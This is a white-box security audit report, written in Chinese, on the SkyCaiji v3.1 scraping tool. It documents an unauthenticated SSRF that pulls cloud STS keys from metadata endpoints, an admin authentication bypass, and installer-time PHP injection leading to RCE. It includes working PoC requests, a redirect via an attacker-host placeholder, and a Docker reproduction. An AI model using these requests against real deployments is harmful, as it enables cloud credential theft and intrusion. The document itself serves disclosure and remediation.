# SkyCaiji（蓝天采集器）白盒安全审计报告

- 目标：发现**未认证、0-click、可泄漏 AK/SK** 的漏洞，并以 Docker 复现。
- 被审对象：本仓库 SkyCaiji `v3.1`（应用代码 `vendor/skycaiji/app/`，框架为定制版 ThinkPHP 5.0.x，`THINK_VERSION='1.2 skycaiji'`）。
- 方法：以「事实/意图」图驱动的状态空间搜索，正向+反向污点，四个正交维度并行深挖（SQLi / SSRF / 框架 n-day / 机密直泄·反序列化·install），全部结论以本仓库实际源码为准并主动寻找反证。
- 结论：确认 **1 个 Critical 未认证 0-click AK/SK 泄漏**（主漏洞 V1，已 Docker 实弹复现）+ 2 个支撑/条件性发现。经典 TP5 n-day、未认证 SQLi、未认证机密直泄、未认证反序列化均已逐条排除（见「已覆盖维度」）。

---

## 一、漏洞一览（按严重级排序）

| 编号 | 严重级 | 类别 | 可达性 | 位置 |
|---|---|---|---|---|
| **V1** | **Critical** | 未认证 SSRF → 云元数据 → 临时 AK/SK 泄漏 | 未认证 / 0-click（需开启"单页采集"且空密钥） | `admin/controller/Api.php:67` → `admin/event/CpatternSingle.php:19` |
| V2 | Medium | 认证绕过（`admin/index/*`、`admin/api/*` 免登录） | 未认证 | `admin/behavior/Init.php:95`、`admin/controller/BaseController.php:20` |
| V3 | High（仅未安装态） | 安装期 `config.php` PHP 代码注入 → RCE | 未认证（目标处于未安装态时） | `install/controller/Index.php:179-187` |

> 下文路径中的 `app/` 均指 `vendor/skycaiji/app/`。

---

## V1 —【Critical】未认证 0-click SSRF → 云元数据 → 临时 AK/SK 泄漏

### 类别
服务端请求伪造（SSRF，未认证）→ 泄漏云厂商实例元数据中的 RAM/STS 临时凭据（AccessKeyId / AccessKeySecret / SecurityToken）；同时可用于内网探测、访问内网服务。

### 可达性
- 认证：**无需任何认证**（不带 Cookie；GET 不触发 usertoken 校验；admin 鉴权钩子对 `api` 控制器直接放行）。
- 交互：**0-click**，单个 GET 请求。
- 前置条件：目标存在一个 `module=pattern` 且开启"单页采集"(`single.open=1`) 的任务；当该任务 `single.key` 为空时**完全无需任何密钥**。「单页采集」是 SkyCaiji 面向外部系统的触发接口，空密钥是常见部署形态；即便设置了密钥，密钥也仅为 `md5(single.key)` 随 URL 明文传输，易经日志/Referer 泄漏，知悉者同样可利用。

### 完整数据流（外部输入 → 缺失校验 → 危险 sink）
1. 路由 `api_single/:id/[:key]` → `admin/api/single`。
   `app/route.php:3`：`'api_single/:id/[:key]'=>['admin/api/single',...]`；`url_route_must=false`（`app/config.php:87`），`?s=/admin/api/single` 亦可达。
2. **鉴权被放行**（V2）：`app/admin/behavior/Init.php:95` 对非管理员仅拒绝 `index`/`api` 之外的控制器 → `api` 控制器放行；`app/admin/controller/BaseController.php:15-24` `_initialize` 仅在 POST 且控制器≠`api` 时校验 `_usertoken_` → GET + api 控制器**完全免校验**。
3. `app/admin/controller/Api.php:67` `singleAction`：
   - `$taskData=$mtask->cacheById($taskId)`（任务需存在）；
   - `$singleConfig['open']` 必须为真，否则 `未开启单页采集模式`；
   - `if($singleConfig['key']){ if($key!=md5($singleConfig['key'])) 拒绝 }` ← **key 为空则跳过**；
   - 模块 `pattern` → 实例化 `CpatternSingle` → `collectSingle($singleConfig)`。
4. **攻击者可控的抓取 URL**：`app/admin/event/CpatternSingle.php:19`
   `$curUrl=input('url','','trim');`（另有 `:29` `source_url`、`:34-44` `levelN_url` 同样取自请求）。
5. → `loadSingle('url','',$curUrl,...)` → `getFields($curUrl)`（`app/admin/event/Cpattern.php:1278`，URL 仅需匹配 `^\w+://`，`http(s)://`、`file://` 均过正则）
   → `get_page_html($curUrl,...)`（`app/admin/event/CpatternColl.php:1575`）
   → `get_html($url,...)`（`app/common.php:217`）
   → `\util\Curl`（`app/extend/util/Curl.php`）：**无 host/IP/协议白名单**，`CURLOPT_FOLLOWLOCATION=1` 且手动递归跟随 3xx，SSL 校验关闭 —— **SSRF 原语零防护**。
6. **整页响应回显**：字段提取 `dvalue` 模块直接 `$val=$html`（`app/admin/event/CollectCommon.php:2663-2665`）→ 抓取到的整页响应体原样进入返回数据 → `app/admin/controller/Api.php:139` `jsonSend('',$fieldData['data'],1)` 回显给**未认证调用者**。

### 反证排除（已主动验证不成立的"不可利用"假设）
- "需要登录/会话"：实测请求**不带任何 Cookie**、HTTP 200 正常返回（见 PoC）。GET 不触发 usertoken；api 控制器被鉴权钩子放行。
- "需要接口密钥"：实测 `single.key` 为空时无需密钥；设 key 后空/错 key 均返回 `接口密钥错误`，`md5(key)` 正确才通过 —— 印证"空密钥即未认证"这一前置条件。
- "URL 有内网/协议过滤"：直连 `http://metadata.internal`（内网别名）成功；且 `http://.../redirect` 经 302 跳转到内网元数据同样成功 → 即便存在首跳 host 白名单也可被重定向绕过。
- "抓取内容不回显"：`dvalue` 字段把整页响应原样返回（实测返回完整 STS JSON）。

### 具体 PoC / 完整检测 EXP
未认证请求（无 Cookie / 无密钥）：
```
GET /index.php/api_single/1?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/<RoleName>
# AWS: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 复现环境用内网别名 metadata.internal 模拟上述地址
```
响应（关键片段，`data[0].content.value` 即服务端取回并回显的临时凭据）：
```json
{"code":1,"msg":"","data":[{"content":{"name":"content","value":
"{\"AccessKeyId\":\"EXAMPLE-STS-ACCESS-KEY-ID-PLACEHOLDER\",\"AccessKeySecret\":\"EXAMPLE-STS-ACCESS-KEY-SECRET-PLACEHOLDER\",\"SecurityToken\":\"EXAMPLE-STS-SESSION-TOKEN-PLACEHOLDER\",\"Expiration\":\"...\",\"Code\":\"Success\"}",
"img":[],"file":[]}}]}
```
（上述为复现环境中 `meta` 服务返回的占位凭据；真实环境此处即为云厂商下发的真实临时 AK/SK。）
302 跟随变体：`GET /index.php/api_single/1?url=http://<attacker-host>/redirect`（该地址 302 → 内网元数据）。

一键复现见 `security-poc/`（`docker compose up -d --build && bash run.sh`）。

### 可串联的攻击链
- 泄漏的云 STS 临时 AK/SK → 直接调用对应云 API（阿里云 OSS/ECS/RAM、AWS S3/EC2 等）→ 按该角色权限横向移动、读写云资产、进一步提权。
- 盲场景（任务字段为站点专用窄规则、不回显整页）：退化为**未认证盲 SSRF** → 内网端口扫描、访问仅内网可达的管理/API 服务、触发内网副作用。
- 与 V2 叠加：V1 的未认证可达正是建立在 V2（`admin/api` 免登录）之上。

### 局限（已证伪为"不可用"的分支，如实记录）
- `file://` 本地任意文件读经此路径**不可用**：`get_html` 以 HTTP 200 判定 `$curl->ok`，`file://` 的 http_code=0 → body 被丢弃返回空（libcurl 本身支持 file://，但被成功状态判定挡住）。HTTP/HTTPS SSRF 不受影响。
- 内容是否回显取决于任务字段类型：`dvalue` / 宽泛 `regex` / `//*` xpath → 整页回显；站点专用窄规则 → 盲 SSRF。

### 修复建议
1. 单页采集接口强制密钥校验，并改为**时间戳签名**（避免密钥明文随 URL 传输与重放）。
2. `get_html`/`\util\Curl` 增加 SSRF 防护：协议白名单（仅 http/https）、拒绝内网/保留网段（`169.254.0.0/16`、`100.100.100.200`、RFC1918、`127.0.0.0/8` 等），且**对重定向后的最终目标**同样校验；关闭盲目跟随到内网的 302。
3. 单页采集目标 URL 限定为任务允许的域；接口增加来源/鉴权限制。

---

## V2 —【Medium】认证绕过：`admin/index/*` 与 `admin/api/*` 免登录

### 类别 / 可达性
访问控制缺陷，未认证。

### 完整数据流
- `app/admin/tags.php:19` 以 `module_init` 注册鉴权钩子 `skycaiji\admin\behavior\Init`。
- `app/admin/behavior/Init.php:77-101`：若非管理员，仅当 `!in_array($curController,['index','api'])` 时 `dispatchJump(false,...)` 拒绝；即 **`admin/index/*`、`admin/api/*` 全部动作对未认证开放**。
- `app/admin/controller/BaseController.php:15-24` `_initialize`：仅 POST 且控制器≠`api` 时校验 `_usertoken_`，**不校验是否登录**。
- `App.php:575` 控制器名正则 + `app/config.php:87` `url_route_must=false` 使 `?s=/admin/api/xxx`、`?s=/admin/index/xxx` 任意可达。

### 实弹验证
- `GET ?s=/admin/index/index`（登录页）200 可达；`GET ?s=/admin/api/clientinfo` 200 返回 `{"url":...,"v":"3.1"}`；`GET ?s=/admin/setting/caiji` 被拦为"抱歉，请登录管理员账号！" → 证明**仅 index/api 控制器免登录，边界清晰**。

### 影响与说明
本身是 V1 的可达性基础。其余免登录动作多被 per-feature 开关 / 一次性缓存密钥门控（`\util\Funcs::uniqid()=md5(uniqid+microtime+rand)` 不可预测，故 `proc_open_exec`/`swoole_server`/`collect_process` 等命令执行类端点**非未认证可达**）。

### 附带低危信息泄漏
登录页 `app/admin/view/common/header_public.html:50` 输出 `admincp:{:json_encode(g_sc_c('admincp'))}` 与 `usertoken`。经核实 `admincp` 仅含 UI 偏好（skin/mini/newwin/fixed/narrow/check_skip，`Backstage.php:577` 白名单），**非 AK/SK**；usertoken 为会话 CSRF token。价值低，记录备案。

### 修复建议
将 `admin/api`、`admin/index` 的免登录放行收敛为「仅登录/验证码/找回密码/带独立签名校验的对外接口」显式白名单，其余一律要求登录态。

---

## V3 —【High，仅未安装态】安装期 `config.php` PHP 代码注入 → RCE

### 类别 / 可达性
代码注入 → 持久 RCE。未认证，但**仅当目标处于未安装态**（新部署窗口；本仓库原始 checkout 即无 `data/install.lock`、无 `data/config.php`，处于未安装态）。安装完成后 `install/controller/Index.php:19-26` 构造函数检测 `install.lock` 并短路，重装被拦。

### 完整数据流
- `install/controller/Index.php:48-125` `step2`：`db_*` 参数写入 `cache('install_config')`。
- `:179-187` `step3`：读取模板 `install/data/config.php`（形如 `'DB_PWD' => '{$DB_PWD}'`，单引号字符串），对各 `db_*` 做 `str_replace('{$DB_PWD}',$v,...)` **无任何转义**后写入 `data/config.php`；该文件每请求被 `include`。
- 将 PHP 载荷置于 `db_pwd`（该字段不参与 SQL 拼接），并指向攻击者可达的 MySQL（使 `:163-177` 建库建表成功），单引号闭合即注入 PHP → 写入 `config.php` → 持久 RCE → 可读取全部机密（含真实数据库账密 = DB 层 SK、config 表中 translate/email/proxy 等凭据）。

### 相关（低影响）
`install/Upgrade.php` 构造函数不检 `install.lock`，DB 版本 < 3.1 时 `install/upgrade/*` 免登录可执行，但仅做 DDL/DML 迁移，非 getshell。真正的升级下载/解压/覆写（getshell 面）在 `admin/controller/Upgrade.php`，属 admin 模块需登录。

### 修复建议
- 对 `db_*` 写入模板前做严格转义（`addslashes`/`var_export`），或改用 `var_export` 生成配置文件。
- `install` 全模块（含 `Upgrade`）在 `install.lock` 存在时统一短路；部署文档强调安装后立即产生 lock 并移除 install 目录。

---

## 二、已覆盖维度与排除结论（覆盖度与证伪留痕）

| 维度 | 结论 | 关键依据（本仓库源码） |
|---|---|---|
| 认证/授权 | ✅ 发现 V2 免登录；命令执行类端点因一次性 `uniqid` 缓存密钥不可达 | `admin/behavior/Init.php:95`、`BaseController.php:20`、`util/Funcs.php:321`、`util/Param.php:59-96` |
| SSRF | ✅ 发现 V1（未认证）；另：`Tool::preview`/`Proxy::testApi`/`Release::toapiApp`/`Provider::save`/`Develop::apiTest` 为**需登录**的 SSRF/LFR | `CpatternSingle.php:19`、`common.php:217`、`extend/util/Curl.php`；SSRF 原语零防护 |
| SQL 注入 | ❌ 无可读 config/user 的注入（认证与否均无）。定制 TP5 加固 parseKey 严格正则、parseOrder 方向白名单、IN/BETWEEN 绑定、EXP 需 Expression 实例 | `tp/.../db/builder/Mysql.php:112`、`db/Builder.php:363-398,594-596`；`api/Data.php`→`Dataapi.php:160` 全参数化 |
| ThinkPHP5 框架 n-day | ❌ 全部已修补/不可未认证触发：`\think\app/invokefunction` RCE（`App.php:575` 控制器名正则）、`_method=__construct` 属性覆盖 RCE（`Request.php:526` 动词白名单）、filter 回调不可控、异常页仅 debug 时泄漏（`app_debug=false`） | `tp/library/think/App.php`、`Request.php`、`exception/Handle.php:134` |
| 反序列化 | ❌ 无「未认证 + 攻击者可控字节」直达链；`safe_unserialize` 拦 `O:`，且全仓库无类 `implements Serializable` → `C:` 无 gadget；可控字节→unserialize 的点均需登录 | `common.php:479`；api/index/install 模块无 `unserialize` |
| 机密直泄（逻辑） | ❌ 免登录动作均不回显 translate/email/proxy/store 级机密；store_update/certificate 依赖服务端 authkey 算 authsign | `admin/controller/Api.php:231-301`、`model/Provider.php:150-205` |
| 命令执行 | ❌ `proc_open_exec`/`swoole_server`/`collect_process` 等需不可预测的一次性缓存密钥 | `admin/controller/Index.php:765-833`、`util/Param.php` |
| install / 重装 | ✅ 发现 V3（未安装态 RCE）；安装后重装被 `install.lock` 拦 | `install/controller/Index.php:19-26,179-187` |
| 依赖/框架版本 | 定制 TP5.0.x，经典 CVE 已逐条核验（见框架维度） | `composer.lock`、`tp/base.php:12` |

### 未覆盖 / 未深入项及原因
- **采集/发布引擎深层**（`CollectCommon`/`ReleaseBase`/`Rtoapi`/`ApiApp` 等）仅覆盖到与未认证入口相关的调用路径；其内部大量 `get_html`/模板/表达式 sink 的 URL/数据来自**已存任务配置**（需管理员），与未认证目标正交，未逐一展开。
- **第三方 vendor 库**（phpexcel、phpmailer、think-mongo/oracle/queue 等）未做独立 CVE 审计；默认未在未认证路径加载。
- **插件**（`plugin/release/*`、`plugin/func/*`）默认不含云存储（OSS/七牛等）凭据处理；若部署额外安装了存储插件，其 AK/SK 亦落在 config 表，可经 V3(RCE) 或登录后读取，但不在默认未认证面。
- **S1（受限框架缺陷，备案）**：`Mysql.php:98-101` `json_extract` 在 strict parseKey 之前原样插入 `$name`，可用 `'` 突破；但被硬性要求"输入不含 `(`"锁死在数据集自表 ORDER BY/WHERE，读不到 config/user，且需管理员预置 `order_field`/`field`。未达"可读敏感表"门槛，故不计为达标注入，留作回归线索。

---

## 三、Docker 复现

目录 `security-poc/`：
```bash
cd security-poc
docker compose up -d --build     # app(SkyCaiji 3.1)=php7.4 / db=mysql5.7 / meta=伪云元数据服务
bash run.sh                      # 自动安装 → 植入“受害者已有配置” → 未认证 0-click 攻击并打印泄漏的临时 AK/SK
```
`run.sh` 第 4 步发出的请求**不带任何 Cookie/密钥**，响应 `data[0].content.value` 即服务端从内网元数据服务取回、回显给未认证攻击者的 `AccessKeyId/AccessKeySecret/SecurityToken`。详见 `security-poc/README.md`。

---

> 本报告仅陈述已确认事实与已主动排除的反证；受限/条件性结论均标注其前置条件与边界。
